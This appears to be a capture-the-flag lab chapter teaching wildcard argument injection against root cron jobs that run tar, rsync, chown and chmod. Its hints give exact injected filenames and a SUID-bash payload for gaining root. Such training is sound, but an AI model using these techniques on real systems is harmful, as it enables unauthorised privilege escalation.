# Chapter 06 — "Wildcard Expansion"  ·  Argument Injection via `*`

> **Host:** `hollow-archive-01` (compose service `target-wild`)
> **Foothold:** `labuser1 : password123`
> **Objective:** become **root** and read `/root/flag.txt`
> **Difficulty:** ★★☆☆ → ★★★☆ (A/B are quick; C/D need the sticky-bit insight)

---

## Mission brief

Root's housekeeping on this box runs every minute: it tars a working dir,
rsyncs another to a backup account, and chowns/chmods two more. Every one of
those jobs ends in a bare, unquoted `*`.

That `*` is the bug. The **shell** expands `*` into the list of filenames
*before* the command runs — so if you can create a file whose name looks like a
command-line option, the program receives an option, not a filename. You pick
the filenames in those directories, so you write part of root's command line.

> **The whole idea in one line:** `tar czf backup *` becomes
> `tar czf backup --checkpoint-action=exec=sh evil.sh …` the moment a file
> named `--checkpoint-action=exec=sh evil.sh` sits in the directory.

You already met a taste of this in Chapter 02 (Station E, the tar job). This
host is the deep dive: four tools, four different injections.

---

## Objective and rules

- **Win condition:** read `/root/flag.txt`. Flag format: `R2R{...}`.
- **In scope:** this container only.
- **Connect:** from the attacker box, `ssh labuser1@target-wild` (password `password123`).
  Or `docker exec -it -u labuser1 target-wild bash`.
- Four independent paths. One is enough. Land all four.
- Jobs tick every 60 seconds. A shell a job spawns dies with the job — have
  your payload copy the flag out (`cp /root/flag.txt /tmp/flag`) or drop a SUID
  bash (`cp /bin/bash /tmp/rb; chmod 6777 /tmp/rb`).

---

## Recon starter

```bash
cat /etc/cron.d/rtr-*                                   # the exact commands
cat /usr/local/sbin/*-run.sh                            # what each job runs
ls -ld /opt/archive /opt/sync /opt/pipeline /opt/conf   # who can write them
```

For each job, answer three things: **which tool**, **which of its options turns
a filename into an instruction**, and **can I create a file with that name?**
(`touch -- "--option..."` — the `--` stops `touch` from eating your dashes.)

---

## Stations

| Station | Job | Tool | The option you smuggle in |
|---|---|---|---|
| A | `archive-run.sh` | `tar czf … *` | `--checkpoint-action=exec=sh runme.sh` (+ `--checkpoint=1`) |
| B | `sync-run.sh` | `rsync -a * host:` | `-e sh payload.sh` (rsync's remote-shell flag) |
| C | `pipeline-run.sh` | `chown -R root:root *` | `--reference=ref` — flips a root script to **you** |
| D | `conf-run.sh` | `chmod -R 700 *` | `--reference=ww` — opens a root script's mode |

A and B give you code execution outright. C and D hand you a **root-owned
script** the same job then runs — the directories are *sticky* (`1777`, like
`/tmp`), so you can't just delete or edit that script, but you can plant a
`--reference` file that makes `chown`/`chmod` do it for you.

---

## Hints

<details><summary>Station A — tar</summary>

`tar` with `-c` fires actions at "checkpoints". Create three files in
`/opt/archive`: a script `runme.sh`, an empty file named `--checkpoint=1`, and
an empty file named `--checkpoint-action=exec=sh runme.sh`. Use
`touch -- "--checkpoint-action=exec=sh runme.sh"`. Wait one tick.

</details>

<details><summary>Station B — rsync</summary>

`rsync`'s `-e` option sets the *remote shell*. If a filename becomes `-e sh
payload.sh`, rsync runs `sh payload.sh` — locally, as root — to "start the
connection". Create `payload.sh` and an empty file named `-e sh payload.sh` in
`/opt/sync`. Wait one tick.

</details>

<details><summary>Station C — chown</summary>

`ls -ld /opt/pipeline` — the `t` means sticky: you can add files but not touch
root's `process.sh`. `chown --reference=FILE` copies FILE's owner instead of
using `root:root`. Create an empty file `ref` (owned by you) and an empty file
named `--reference=ref` in `/opt/pipeline`. After the next tick, `process.sh`
is yours — overwrite it with your payload, wait one more tick.

</details>

<details><summary>Station D — chmod</summary>

Same idea, mode instead of owner. `chmod --reference=FILE` copies FILE's mode.
Make a world-writable file `ww` (`chmod 666 ww`) and an empty file named
`--reference=ww` in `/opt/conf`. After the next tick, `hook.sh` is mode `666` —
write your payload into it, wait one more tick.

</details>

---

## Capture

```bash
id
cat /root/flag.txt
```

The debrief — the expansion mechanic, each tool's dangerous flag, detection,
and the fix — is in [WRITEUP.md](WRITEUP.md). Try the box before you open it.
